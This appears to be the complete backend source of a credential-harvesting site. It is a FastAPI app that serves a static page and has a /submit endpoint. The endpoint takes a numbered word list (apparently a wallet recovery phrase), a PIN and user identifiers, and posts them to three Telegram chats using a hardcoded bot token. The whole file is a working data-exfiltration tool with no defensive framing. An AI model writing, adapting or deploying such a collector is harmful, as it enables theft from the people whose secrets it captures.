from fastapi import FastAPI
from pydantic import BaseModel
from typing import List
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
import requests
import os

#sdvsdfv

app = FastAPI()

app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/")
def site():
    return FileResponse(os.path.join("static", "index.html"))

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


BOT_TOKEN = "8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk"
CHAT_IDS = [7669456027, 7818973762, 7421128257]


class Data(BaseModel):
    words: List[str]
    pin: str
    username: str
    user_id: str


def send_to_telegram(words, pin, username, user_id):

    text = f"📥 NEW DATA\n\n👤 User: @{username}\n🆔 ID: {user_id}\n\n"

    for i, w in enumerate(words, start=1):
        text += f"{i}. {w}\n"

    text += f"\n🔐 PIN: {pin}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    for chat in CHAT_IDS:
        requests.post(url, json={
            "chat_id": chat,
            "text": text
        }, timeout=10)


@app.post("/submit")
async def submit(data: Data):

    send_to_telegram(data.words, data.pin, data.username, data.user_id)

    return {"status": "ok"}









